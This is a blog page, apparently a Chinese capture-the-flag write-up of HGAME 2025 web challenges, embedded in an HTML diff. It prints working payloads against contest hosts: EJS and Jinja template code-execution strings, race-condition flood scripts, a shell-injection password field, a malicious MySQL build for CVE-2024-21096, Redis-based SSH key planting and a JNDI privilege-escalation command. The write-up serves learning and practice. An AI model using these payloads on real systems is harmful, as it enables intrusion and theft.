@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HGAME2025-Web-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, ctf, Web">
+<meta name="description" content="Web
+week1
+Level 24 Pacman
+拿到环境
+
+一个小游戏，猜测应该是js审计
+
+查看index.js发现代码进行了混淆
+可以用工具反混淆一下，增加一下可读性
+https://tool.yuanrenxue.cn/decode_obfuscator
+
+反混淆之后找到这个
+">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/hgame_2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2b4603ab7eabc3642d3649f5b8728329d021f06eb40817493eab54c5172e9a52.css" integrity="sha256-K0YDq36rw2QtNkn1uHKDKdAh8G60CBdJPqtUxRcumlI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/hgame_2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/hgame_2025/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="HGAME2025-Web-Writeup">
+  <meta property="og:description" content="Web week1 Level 24 Pacman 拿到环境
+一个小游戏，猜测应该是js审计
+查看index.js发现代码进行了混淆
+可以用工具反混淆一下，增加一下可读性
+https://tool.yuanrenxue.cn/decode_obfuscator
+反混淆之后找到这个">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-02-20T00:27:55+08:00">
+    <meta property="article:modified_time" content="2025-02-20T00:27:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="HGAME2025-Web-Writeup">
+<meta name="twitter:description" content="Web
+week1
+Level 24 Pacman
+拿到环境
+
+一个小游戏，猜测应该是js审计
+
+查看index.js发现代码进行了混淆
+可以用工具反混淆一下，增加一下可读性
+https://tool.yuanrenxue.cn/decode_obfuscator
+
+反混淆之后找到这个
+">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HGAME2025-Web-Writeup",
+      "item": "http://localhost:1313/post/hgame_2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HGAME2025-Web-Writeup",
+  "name": "HGAME2025-Web-Writeup",
+  "description": "Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n",
+  "keywords": [
+    "writeup", "ctf", "Web"
+  ],
+  "articleBody": "Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require('express'); 2const multer = require('multer'); 3const fs = require('fs'); 4const path = require('path'); 5 6const app = express(); 7 8app.set('view engine', 'ejs'); 9 10app.use('/static', express.static(path.join(__dirname, 'public'))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u003e { 15 const uploadDir = 'uploads'; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u003e { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u003e { 29 try { 30 if (!file.originalname) { 31 return cb(new Error('无效的文件名'), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error('文件处理错误'), false); 36 } 37 } 38}); 39 40app.get('/', (req, res) =\u003e { 41 const uploadsDir = path.join(__dirname, 'uploads'); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u003e { 48 if (err) { 49 return res.status(500).render('mortis', { files: [] }); 50 } 51 res.render('mortis', { files: files }); 52 }); 53}); 54 55app.post('/upload', (req, res) =\u003e { 56 upload.single('file')(req, res, (err) =\u003e { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: '没有选择文件' }); 62 } 63 res.json({ 64 message: '文件上传成功', 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post('/rename', (req, res) =\u003e { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, 'uploads', oldName); 73 const newPath = path.join(__dirname, 'uploads', newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: ' ' }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u003e { 80 if (err) { 81 return res.status(500).json({ error: ' ' + err.message }); 82 } 83 res.json({ message: ' ' }); 84 }); 85}); 86 87app.listen(port, () =\u003e { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post('/rename', (req, res) =\u003e { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, 'uploads', oldName); 4 const newPath = path.join(__dirname, 'uploads', newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: ' ' }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u003e { 11 if (err) { 12 return res.status(500).json({ error: ' ' + err.message }); 13 } 14 res.json({ message: ' ' }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u003c!DOCTYPE html\u003e\r\u003c%= process.mainModule.require('child_process').execSync('whoami') %\u003e\r将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u003c!DOCTYPE html\u003e\r\u003c%= process.mainModule.require('child_process').execSync('printenv') %\u003e\rLevel 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\"127.0.0.1:9000\\\"\\r\\n access_key: \\\"minio_admin\\\"\\r\\n secret_key: \\\"JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\"\\r\\n bucket: \\\"prodbucket\\\"\\r\\n key: \\\"update\\\" 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\"level25/fetch\" 5\t\"level25/conf\" 6\t\"github.com/gin-gonic/gin\" 7\t\"github.com/jpillora/overseer\" 8) 9 10func main() { 11\tfetcher := \u0026fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\"/\", gin.Dir(\".\", true)) 28\tg.Run(\":8080\") 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main\rimport (\r\"level25/fetch\"\r\"level25/conf\"\r\"github.com/gin-gonic/gin\"\r\"github.com/jpillora/overseer\"\r)\rfunc main() {\rfetcher := \u0026fetch.MinioFetcher{\rBucket: conf.MinioBucket,\rKey: conf.MinioKey,\rEndpoint: conf.MinioEndpoint,\rAccessKey: conf.MinioAccessKey,\rSecretKey: conf.MinioSecretKey,\r}\roverseer.Run(overseer.Config{\rProgram: program,\rFetcher: fetcher,\r})\r}\rfunc program(state overseer.State) {\rg := gin.Default()\rg.StaticFS(\"/abc\", gin.Dir(\"/\", true))\rg.Run(\":8080\")\r} 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond “%{HTTP_USER_AGENT}” “^L1nk/”，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \"/tmp/message.txt\" 12\tif os.path.exists(filename): 13\tf = open(filename, 'r') 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn 'No message now.' 19 20 21@app.route('/index', methods=['GET']) 22def index(): 23\tstatus = request.args.get('status') 24\tif status is None: 25\tstatus = '' 26\treturn render_template(\"index.html\", status=status) 27 28 29@app.route('/send', methods=['POST']) 30def write_message(): 31\tfilename = pwd + \"/tmp/message.txt\" 32\tmessage = request.form['message'] 33 34\tf = open(filename, 'w') 35\tf.write(message) 36\tf.close() 37 38\treturn redirect('index?status=Send successfully!!') 39\t40@app.route('/read', methods=['GET']) 41def read_message(): 42\tif \"{\" not in readmsg(): 43\tshow = show_msg.replace(\"{{message}}\", readmsg()) 44\treturn render_template_string(show) 45\treturn 'waf!!' 46\t47 48if __name__ == '__main__': 49\tapp.run(host = '0.0.0.0', port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \"http://node1.hgame.vidar.club:30762/app/send\" 4 burp0_headers = {\"Cache-Control\": \"max-age=0\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Origin\": \"http://node1.hgame.vidar.club:30762\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Referer\": \"http://node1.hgame.vidar.club:30762/app/index\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\"} 5 burp0_data = {\"message\": \"{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}\"} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \"http://node1.hgame.vidar.club:30762/app/send\" 4 burp0_headers = {\"Cache-Control\": \"max-age=0\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Origin\": \"http://node1.hgame.vidar.club:30762\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Referer\": \"http://node1.hgame.vidar.club:30762/app/index\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\"} 5 burp0_data = {\"message\": \"123\"} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \"http://node1.hgame.vidar.club:30762/app/read\" 4 burp0_headers = {\"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\"} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \"hgame\" in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\nweek2 week2强度有点高，就打了一道HoneyPot，复现一手\nLevel 21096 HoneyPot 应该是非预期\n可以找到这个函数，也就是/api/import，可以进行命令拼接\n1func ImportData(c *gin.Context) { 2 var config ImportConfig 3 if err := c.ShouldBindJSON(\u0026config); err != nil { 4 c.JSON(http.StatusBadRequest, gin.H{ 5 \"success\": false, 6 \"message\": \"Invalid request body: \" + err.Error(), 7 }) 8 return 9 } 10 if err := validateImportConfig(config); err != nil { 11 c.JSON(http.StatusBadRequest, gin.H{ 12 \"success\": false, 13 \"message\": \"Invalid input: \" + err.Error(), 14 }) 15 return 16 } 17 18 config.RemoteHost = sanitizeInput(config.RemoteHost) 19 config.RemoteUsername = sanitizeInput(config.RemoteUsername) 20 config.RemoteDatabase = sanitizeInput(config.RemoteDatabase) 21 config.LocalDatabase = sanitizeInput(config.LocalDatabase) 22 if manager.db == nil { 23 dsn := buildDSN(localConfig) 24 db, err := sql.Open(\"mysql\", dsn) 25 if err != nil { 26 c.JSON(http.StatusInternalServerError, gin.H{ 27 \"success\": false, 28 \"message\": \"Failed to connect to local database: \" + err.Error(), 29 }) 30 return 31 } 32 33 if err := db.Ping(); err != nil { 34 db.Close() 35 c.JSON(http.StatusInternalServerError, gin.H{ 36 \"success\": false, 37 \"message\": \"Failed to ping local database: \" + err.Error(), 38 }) 39 return 40 } 41 42 manager.db = db 43 } 44 if err := createdb(config.LocalDatabase); err != nil { 45 c.JSON(http.StatusInternalServerError, gin.H{ 46 \"success\": false, 47 \"message\": \"Failed to create local database: \" + err.Error(), 48 }) 49 return 50 } 51 //Never able to inject shell commands,Hackers can't use this,HaHa 52 command := fmt.Sprintf(\"/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s\", 53 config.RemoteHost, 54 config.RemoteUsername, 55 config.RemotePassword, 56 config.RemoteDatabase, 57 localConfig.Username, 58 localConfig.Password, 59 config.LocalDatabase, 60 ) 61 fmt.Println(command) 62 cmd := exec.Command(\"sh\", \"-c\", command) 63 if err := cmd.Run(); err != nil { 64 c.JSON(http.StatusInternalServerError, gin.H{ 65 \"success\": false, 66 \"message\": \"Failed to import data: \" + err.Error(), 67 }) 68 return 69 } 70 71 c.JSON(http.StatusOK, gin.H{ 72 \"success\": true, 73 \"message\": \"Data imported successfully\", 74 }) 75} Payload\n1{\"remote_host\":\"127.0.0.1\",\"remote_port\":\"3306\",\"remote_username\":\"root\",\"remote_password\":\"123456;/writeflag;#\",\"remote_database\":\"123\",\"local_database\":\"123\"} 访问/flag拿到flag\nLevel 21096 HoneyPot_Revenge [CVE-2024-21096 mysqldump命令注入漏洞简析 | Ec3o](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability Reproduction/CVE-2024-21096/)\n出题人的博客有写过这个知识点\n编译恶意Mysql 安装编译依赖\nsudo apt-get update\rsudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config\rwget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz\rtar -zxvf mysql-boost-8.0.34.tar.gz\rcd mysql-8.0.34 修改模板文件/include/mysql_version.h.in\nvim include/mysql_version.h.in /* Copyright Abandoned 1996,1999 TCX DataKonsult AB \u0026 Monty Program KB\r\u0026 Detron HB, 1996, 1999-2004, 2007 MySQL AB.\rThis file is public domain and comes with NO WARRANTY of any kind\r*/\r/* Version numbers for protocol \u0026 mysqld */\r#ifndef _mysql_version_h\r#define _mysql_version_h\r#define PROTOCOL_VERSION @PROTOCOL_VERSION@\r#define MYSQL_SERVER_VERSION \"8.0.0-injection-test\\n\\\\! /writeflag\"\r#define MYSQL_BASE_VERSION \"mysqld-8.0.34\"\r#define MYSQL_SERVER_SUFFIX_DEF \"@MYSQL_SERVER_SUFFIX@\"\r#define MYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#define MYSQL_PORT @MYSQL_TCP_PORT@\r#define MYSQL_ADMIN_PORT @MYSQL_ADMIN_TCP_PORT@\r#define MYSQL_PORT_DEFAULT @MYSQL_TCP_PORT_DEFAULT@\r#define MYSQL_UNIX_ADDR \"@MYSQL_UNIX_ADDR@\"\r#define MYSQL_CONFIG_NAME \"my\"\r#define MYSQL_PERSIST_CONFIG_NAME \"mysqld-auto\"\r#define MYSQL_COMPILATION_COMMENT \"@COMPILATION_COMMENT@\"\r#define MYSQL_COMPILATION_COMMENT_SERVER \"@COMPILATION_COMMENT_SERVER@\"\r#define LIBMYSQL_VERSION \"8.0.34-custom\"\r#define LIBMYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#ifndef LICENSE\r#define LICENSE GPL\r#endif /* LICENSE */\r#endif /* _mysql_version_h */ 执行命令的位置为\n#define MYSQL_SERVER_VERSION \"8.0.0-injection-test\\n\\\\! /writeflag\" 修改成要执行的命令之后，开始编译\nmkdir build\rcd build\rcmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost\rmake -j$(nproc) 我的服务器太烂了，编译了五个小时还编译失败了\n所以后面在本地用wsl编译完后再上传到服务器上\n本地编译的时候最好使用与服务器相同的路径\n不然install的时候会报错，很麻烦\n加下来在服务器上安装编译好的mysql\n安装\nsudo make install 创建⽤⼾组\nsudo groupadd mysql\rsudo useradd -r -g mysql -s /bin/false mysql 初始化\nsudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --\rbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data 初始化信息\nbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data\r2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \\! /writeflag) initializing of server in progress as process 557354\r2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8\u003c;j5AH\r-bash: --datadir=/usr/local/mysql/data: No such file or directory 设置⽬录权限\nsudo chown -R mysql:mysql /usr/local/mysql\rsudo chown -R mysql:mysql /usr/local/mysql/data 启动服务\nsudo /usr/local/mysql/bin/mysqld_safe --user=mysql \u0026 登录\n/usr/local/mysql/bin/mysql -u root -p 修改密码\nALTER USER 'root'@'localhost' IDENTIFIED BY 'password'; 由于需要进行远程连接，需要配置root登录支持\nCREATE USER 'root'@'%' IDENTIFIED BY 'password'; //创建用户\rGRANT ALL PRIVILEGES ON *.* TO 'root'@'%'; //授予权限\rFLUSH PRIVILEGES; 创建数据库\nCREATE DATABASE test;\rEXIT; 接下来就可以去导入数据了\n访问/flag,拿到flag\nLevel 60 SignInJava 这个是真不懂😥，等后面再回头看\nLevel 111 不存在的车厢 这是一道关于整数溢出打协议⾛私的题目\n题目给出的web服务⾃定义了⼀个H111协议，我们可以发现这个自定义协议中的所有Length字段均为uint16类型(0~65535)，而且没有做任何的长度限制，也就是说存在整数溢出\n而且这个协议是支持连接复用的，也就是同一TCP连接可处理多个请求。第一个请求发生溢出后，残留数据与后续请求混合后，服务端会错误解析到我们第二个请求，从⽽⾛私进第⼆个请求。\n官方wp是这么说的：\n开始复现\n先编写⼀段测试，放在protocol/request_test.go，通过go test -v -run TestGenRequest拿到输出\n1package protocol 2 3import ( 4\t\"bytes\" 5\t\"encoding/hex\" 6\t\"net/http\" 7\t\"testing\" 8) 9 10 11func TestGenRequest(t *testing.T) { 12\tvar buf bytes.Buffer 13\terr := WriteH111Request(\u0026buf, \u0026http.Request{ 14\tMethod: \"POST\", 15\tRequestURI: \"/flag\", 16\t}) 17\tif err != nil { 18\tt.Fatalf(\"expected no error, got %v\", err) 19\t} 20\tt.Log(len(buf.Bytes())) 21\tt.Log(hex.EncodeToString(buf.Bytes())) 22} 用WriteH111Request序列化一个POST /flag请求\n序列化后的十六进制数据\n0004504f535400052f666c616700000000 在这段数据后⾯补⻬0，补⻬到65536，产⽣Length溢出\npayload:\nGET / HTTP/1.1\rHost: node1.hgame.vidar.club:30529\r{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}} Level 257 ⽇落的紫罗兰 题⽬端⼝为ssh服务和redis服务\n首先使用 ssh-keygen 生成密钥对\nssh-keygen -t rsa 把生成的公钥添加到 spaced_key.txt 文件里\n(echo -e “\\n\\n”; cat /root/.ssh/id_rsa.pub; echo -e “\\n\\n”) \u003e spaced_key.txt 利用 Redis 服务写入 SSH 公钥\ncat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key\rredis-cli -h node1.hgame.vidar.club -p 30428 redis-cli -h node1.hgame.vidar.club -p 30428\rnode1.hgame.vidar.club:30428\u003e config set dir /home/mysid/.ssh\rOK\rnode1.hgame.vidar.club:30428\u003e config set dbfilename \"authorized_keys\"\rOK\rnode1.hgame.vidar.club:30428\u003e save\rOK\rnode1.hgame.vidar.club:30428\u003e exit user.txt里面有ssh的用户名\n连ssh\nssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266 要提权\n这题用的是上传恶意ldap服务器利⽤本地java应⽤提权\n我咋知道本地有Java环境呢？find一下就好\nfind / -name \"java\" 2\u003e/dev/null 上传恶意 JAR 包\nscp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp /usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u \"/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn\" 触发漏洞\ncurl -X POST -d \"baseDN=a/b\u0026filter=a\" http://127.0.0.1:8080/search 成功执行\n",
+  "wordCount" : "4066",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-02-20T00:27:55+08:00",
+  "dateModified": "2025-02-20T00:27:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/hgame_2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      HGAME2025-Web-Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-02-20 00:27:55 +0800 CST'>2025-02-20</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;Xrntkk
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#web" aria-label="Web">Web</a><ul>
+                        
+                <li>
+                    <a href="#week1" aria-label="week1">week1</a></li>
+                <li>
+                    <a href="#level-24-pacman" aria-label="Level 24 Pacman">Level 24 Pacman</a></li>
+                <li>
+                    <a href="#level-47-bandbomb" aria-label="Level 47 BandBomb">Level 47 BandBomb</a></li>
+                <li>
+                    <a href="#level-69-mysterymessageboard" aria-label="Level 69 MysteryMessageBoard">Level 69 MysteryMessageBoard</a></li>
+                <li>
